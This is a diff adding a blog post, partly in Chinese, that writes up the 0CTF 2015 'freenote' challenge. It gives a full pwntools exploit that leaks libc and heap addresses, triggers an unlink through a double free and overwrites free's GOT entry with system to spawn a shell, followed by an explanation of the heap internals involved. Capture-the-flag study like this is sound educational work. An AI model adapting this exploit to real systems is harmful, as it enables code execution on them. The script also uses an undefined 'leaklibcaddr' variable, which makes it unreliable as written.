@@ -1540,6 +1540,238 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/01/19/Freenote/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="idongxia">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="idongxia">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/01/19/Freenote/" class="post-title-link" itemprop="url">Freenote writeup -- Understand heap and double free</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2018-01-19 00:34:14" itemprop="dateCreated datePublished" datetime="2018-01-19T00:34:14+08:00">2018-01-19</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Bearbeitet am</span>
+                
+                <time title="Geändert am: 2018-01-01 12:00:00" itemprop="dateModified" datetime="2018-01-01T12:00:00+08:00">2018-01-01</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Kommentare: </span>
+                <a href="/2018/01/19/Freenote/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/01/19/Freenote/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Freenote-writeup-–-Understand-heap-and-double-free"><a href="#Freenote-writeup-–-Understand-heap-and-double-free" class="headerlink" title="Freenote writeup – Understand heap and double free"></a>Freenote writeup – Understand heap and double free</h1><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &apos;x86_64&apos;, os = &apos;linux&apos;, endian=&apos;little&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#elf = ELF(&apos;./freenote_x64&apos;)</span><br><span class="line">p = process(&apos;./freenote_x64&apos;)</span><br><span class="line">#p = remote(&apos;127.0.0.1&apos;,10001)</span><br><span class="line">print proc.pidof(p)</span><br><span class="line">raw_input(&apos;gdb attach&apos;)</span><br><span class="line"></span><br><span class="line">def new_note(x):</span><br><span class="line">    p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    p.send(&quot;2\n&quot;)</span><br><span class="line">    p.recvuntil(&quot;Length of new note: &quot;)</span><br><span class="line">    p.send(str(len(x))+&quot;\n&quot;)</span><br><span class="line">    p.recvuntil(&quot;Enter your note: &quot;)</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">def delete_note(x):</span><br><span class="line">    p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    p.send(&quot;4\n&quot;)</span><br><span class="line">    p.recvuntil(&quot;Note number: &quot;)</span><br><span class="line">    p.send(str(x)+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def list_note():</span><br><span class="line">    p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    p.send(&quot;1\n&quot;)</span><br><span class="line"></span><br><span class="line">def edit_note(x,y):</span><br><span class="line">    p.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    p.send(&quot;3\n&quot;)   </span><br><span class="line">    p.recvuntil(&quot;Note number: &quot;)</span><br><span class="line">    p.send(str(x)+&quot;\n&quot;)   </span><br><span class="line">    p.recvuntil(&quot;Length of note: &quot;)</span><br><span class="line">    p.send(str(len(y))+&quot;\n&quot;)   </span><br><span class="line">    p.recvuntil(&quot;Enter your note: &quot;)</span><br><span class="line">    p.send(y)</span><br><span class="line"></span><br><span class="line">####################leak libc#########################</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    notelen = 0x80</span><br><span class="line">    new_note(&apos;a&apos; * notelen)</span><br><span class="line">    new_note(&apos;b&apos; * notelen)</span><br><span class="line">    delete_note(0)</span><br><span class="line">    new_note(&apos;cccccccc&apos;)</span><br><span class="line">    list_note()</span><br><span class="line">    p.recvuntil(&apos;0. &apos;)</span><br><span class="line">    leak = p.recvuntil(&apos;\n&apos;)</span><br><span class="line">    #log.info(&apos;heap:&apos; + str(u64(leak[8:-1])))</span><br><span class="line">    print leak[0:-1].encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">    delete_note(1)</span><br><span class="line">    delete_note(0)</span><br><span class="line"></span><br><span class="line">    #libc_base = leaklibcaddr - offset          (此处偏移依据libc版本不同，基址页对齐4K,也就是地址后三位为000，如：0x7fabba34b000)</span><br><span class="line">    #进而再算出system, &quot;/bin/sh&quot; 偏移  或者将&quot;/bin/sh\x00&quot; 写入到heap or bss</span><br><span class="line">    system_sh_addr = leaklibcaddr - 0x3724a8   </span><br><span class="line">    print &quot;system_sh_addr: &quot; + hex(system_sh_addr)</span><br><span class="line">    binsh_addr = leaklibcaddr - 0x23e7f1</span><br><span class="line">    print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">    #raw_input()</span><br><span class="line"></span><br><span class="line">    ####################leak heap#########################</span><br><span class="line"></span><br><span class="line">    notelen=0x10</span><br><span class="line"></span><br><span class="line">    new_note(&quot;A&quot;*notelen)</span><br><span class="line">    new_note(&quot;B&quot;*notelen)</span><br><span class="line">    new_note(&quot;C&quot;*notelen)</span><br><span class="line">    new_note(&quot;D&quot;*notelen)</span><br><span class="line">    delete_note(2)</span><br><span class="line">    delete_note(0)</span><br><span class="line"></span><br><span class="line">    new_note(&quot;AAAAAAAA&quot;)</span><br><span class="line">    list_note()</span><br><span class="line">    p.recvuntil(&quot;0. AAAAAAAA&quot;)</span><br><span class="line">    leak = p.recvuntil(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">    print leak[0:-1].encode(&apos;hex&apos;)</span><br><span class="line">    leakheapaddr = u64(leak[0:-1].ljust(8, &apos;\x00&apos;))</span><br><span class="line">    print hex(leakheapaddr)</span><br><span class="line"></span><br><span class="line">    delete_note(0)</span><br><span class="line">    delete_note(1)</span><br><span class="line">    delete_note(3)</span><br><span class="line"></span><br><span class="line">    ####################unlink exp#########################</span><br><span class="line"></span><br><span class="line">    notelen = 0x80</span><br><span class="line"></span><br><span class="line">    #new_note(&quot;/bin/sh\x00&quot;+&quot;A&quot;*(notelen-8))</span><br><span class="line">    new_note(&quot;A&quot;*notelen)</span><br><span class="line">    new_note(&quot;B&quot;*notelen)</span><br><span class="line">    new_note(&quot;C&quot;*notelen)</span><br><span class="line"></span><br><span class="line">    delete_note(2)</span><br><span class="line">    delete_note(1)</span><br><span class="line">    delete_note(0)</span><br><span class="line"></span><br><span class="line">    fd = leakheapaddr - 0x1808 #notetable</span><br><span class="line">    bk = fd + 0x8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload  = &quot;&quot;</span><br><span class="line">    payload += p64(0x0) + p64(notelen+1) + p64(fd) + p64(bk) + &quot;A&quot; * (notelen - 0x20)</span><br><span class="line">    payload += p64(notelen) + p64(notelen+0x10) + &quot;A&quot; * notelen</span><br><span class="line">    payload += p64(0) + p64(notelen+0x11)+ &quot;\x00&quot; * (notelen-0x20)</span><br><span class="line"></span><br><span class="line">    new_note(payload)</span><br><span class="line"></span><br><span class="line">    delete_note(1)</span><br><span class="line"></span><br><span class="line">    free_got = 0x602018</span><br><span class="line"></span><br><span class="line">    payload2 = p64(notelen) + p64(1) + p64(0x8) + p64(free_got) + &quot;A&quot;*16 + p64(binsh_addr)</span><br><span class="line">    payload2 += &quot;A&quot;* (notelen*3-len(payload2)) </span><br><span class="line"></span><br><span class="line">    edit_note(0, payload2)</span><br><span class="line">    edit_note(0, p64(system_sh_addr))</span><br><span class="line"></span><br><span class="line">    delete_note(1)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="泄露libc基址的方法"><a href="#泄露libc基址的方法" class="headerlink" title="泄露libc基址的方法:"></a>泄露libc基址的方法:</h2><ul>
+<li>运行脚本程序  python -m pdb myexp.py   (过程中会打印出进程号xxx)</li>
+<li>gdb attach  xxx     <ul>
+<li>vmmap 查看内存分布</li>
+<li>p main_arena</li>
+<li>p main_arena.bins[0]     - p &amp;main_arena.bins[0]</li>
+</ul>
+</li>
+<li>通过泄露unsort_bin 地址，我们来计算libc函数基址以及system 函数地址</li>
+</ul>
+<h3 id="leaking-a-heap-address-is-fairly-simple-though"><a href="#leaking-a-heap-address-is-fairly-simple-though" class="headerlink" title="leaking a heap address is fairly simple though:"></a>leaking a heap address is fairly simple though:</h3><ol>
+<li>Allocate 4 chunks.</li>
+<li>Free chunk 3 and chunk 1 (in that order, so that malloc writes the two pointers into chunk 1).</li>
+<li>Allocate another chunk of size 1 (or 8). This chunk will be placed where chunk 1 used to be and  where its FD and BK pointers still are, with the BK pointer pointing to chunk 3.</li>
+<li>Print the notes, since this is a %s print, we can leak the FD (or BK if chosen size in step 3 was 8) pointer of chunk 1 which in our case points to chunk 3 (heap memory).</li>
+</ol>
+<blockquote>
+<p>This same technique can be used to leak a libc address (the head of  the freelist is in the .bss of the libc). Simply follow the same steps,  but now it suffices to allocate chunks 1 and 2 and free the first.</p>
+</blockquote>
+<h3 id="对漏洞利用步骤："><a href="#对漏洞利用步骤：" class="headerlink" title="对漏洞利用步骤："></a>对漏洞利用步骤：</h3><p>我们通过新建两个note,然后free(0),再new_note(“aaaaaaaa”),在new_note时unsorted_bin  双向链表中只有free的note0,当再次申请堆内存时，就会重新获取trunk0,  “aaaaaaaa”就会覆盖trunk0的fd，list_note()就会泄露trunk0的bk，而bk指向的是main_arena中的unsort_bin  首地址(就是p &amp;main_arena.bins[0]地址减去0x10)，  可以算出libc_base的地址，从而确定libc中函数的地址。</p>
+<ol>
+<li>unsorted_bin 双向链表采用的是头部插入的方式，header(unsorted_bin) fd 指向最新插入元素的地址，并且采用FIFO的方式，那么泄露的第一个插入进 unsorted_bin的trunk的fd，fd就是unsorted_bin的首地址，从而可以算出libc_base. 如果泄露bk，bk就是第二个插入到unsorted_bin的首地址，利用此方法 可以泄露出heap的地址，进而计算出heap_base</li>
+<li>如何我们要unlink的trunk的首地址指针为P，那么我们需要找到一个指针X(满足条件*X = P), 我们需要在note table(形式结构体如下：)</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Struct note&#123;</span><br><span class="line">   int flag;</span><br><span class="line">   int length;</span><br><span class="line">   char* content;</span><br><span class="line"> &#125;note;</span><br><span class="line">fd = X - 0x18</span><br><span class="line">bk = X - 0x10</span><br></pre></td></tr></table></figure>
+
+<p>以64bit为例,假设找到了一个已知地址的ptr是指向p(p指向堆上的某个地方)的，通过堆溢出，我们可以做如下的修改:</p>
+<ul>
+<li>p-&gt;fd=ptr-0x18</li>
+<li>p-&gt;bk=ptr-0x10</li>
+</ul>
+<p>布置好如此结构后，再触发unlink宏，会发生如下情况:</p>
+<ol>
+<li>FD=p-&gt;fd(实际是ptr-0x18)</li>
+<li>BK=p-&gt;bk(实际是ptr-0x10)</li>
+<li>检查是否满足上文所示的限制，由于FD-&gt;bk和BK-&gt;fd均为*ptr(即p)，由此可以过掉这个限制</li>
+<li>FD-&gt;bk=BK</li>
+<li>BK-&gt;fd=FD(p=ptr-0x18)</li>
+</ol>
+<blockquote>
+<p>执行unlink后, P -&gt; X - 0x18 （P的值变成X - 0x18） X指向的地址做任意写操作,就能通过再次覆盖修改X的值,继而使X指向我们想修改的任意空间,从而实现对任意地址的任意修改.</p>
+</blockquote>
+<h3 id="合并方式"><a href="#合并方式" class="headerlink" title="合并方式"></a>合并方式</h3><ul>
+<li>前向合并:   -如果检查当前块P的pre_inuse位为0,就把前一块P0从freelist中取出来,这个过程会对P0执行unlink操作.</li>
+<li>后向合并(后一块P1非TOPchunk):     -通过 块P地址+size  获取块P的后一块P1,再通过P1的后一块P2的pre_inuse位来判断块P1的状态,如果是0,代表P1是free的,对P执行unlink操作最后,把前面free出来的合并块(A+B)放到unsorted  chunk里,如果P1是TOPchunk,就直接合并到TOPchunk.</li>
+</ul>
+<h3 id="realloc-关键"><a href="#realloc-关键" class="headerlink" title="realloc 关键"></a>realloc 关键</h3><p>在执行该语句：edit_note(0, payload2)， 程序会调用realloc函数（void * realloc ( void *  ptr, size_t new_size );），因为传入的地址为X - 0x18,  根据realloc行为，我们希望修改X-0x18地址处的数据，那么必须使realloc函数执行后，返回的ptr指针不变，此时令realloc前后的长度保持一致，即newsize  = oldsize。因此在该题中会覆盖X-0x18的内容。 realloc的行为方式，结合源码总结为：</p>
+<ol>
+<li>realloc失败的时候，返回NULL；</li>
+<li>realloc失败的时候，原来的内存不改变，也就是不free或不move，(这个地方很容易出错)；</li>
+<li>假如原来的内存后面还有足够多剩余内存的话，realloc的内存=原来的内存+剩余内存,realloc还是返回原来内存的地址;  假如原来的内存后面没有足够多剩余内存的话，realloc将申请新的内存，然后把原来的内存数据拷贝到新内存里，原来的内存将被free掉, realloc返回新内存的地址；</li>
+<li>如果size为0，效果等同于free()；</li>
+<li>传递给realloc的指针可以为空，等同于malloc；</li>
+<li>传递给realloc的指针必须是先前通过malloc(), calloc(), 或realloc()分配的。</li>
+</ol>
+<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><p>通过泄露的libc地址我们可以计算出 system() 函数和 “/bin/sh”  字符串在内存中的地址，通过泄露的堆的地址我们能得到note table的地址。然后我们构造一个假的note，利用使用double  free的漏洞触发unlink，将note0的位置指向note table的地址。随后我们就可以通过编辑note0来编辑note  table了。通过编辑note table我们把note0指向 free() 函数在got表中的地址，把note1指向 “/bin/sh”  在内存中的地址。然后我们编辑note0把 free() 函数在got表中的地址改为 system() 的地址。最后我们执行delete  note1操作。因为我们把note1的地址指向了 “/bin/sh” ，所以正常情况下程序会执行 free(“/bin/sh”)  ，但别忘了我们修改了got表中free的地址，所以程序会执行 system(“/bin/sh”)。</p>
+<p>#####参考链接</p>
+<ul>
+<li><a href="https://kitctf.de/writeups/0ctf2015/freenote" target="_blank" rel="noopener">https://kitctf.de/writeups/0ctf2015/freenote</a> </li>
+<li><a href="http://rk700.github.io/2015/04/21/0ctf-freenote/" target="_blank" rel="noopener">http://rk700.github.io/2015/04/21/0ctf-freenote/</a></li>
+<li><a href="http://www.tuicool.com/articles/IfYZri3" target="_blank" rel="noopener">http://www.tuicool.com/articles/IfYZri3</a></li>
+<li><a href="http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up" target="_blank" rel="noopener">http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/01/13/AFL/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1770,7 +2002,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-count">8</span>
                     <span class="site-state-item-name">Artikel</span>
                   </a>
                 </div>
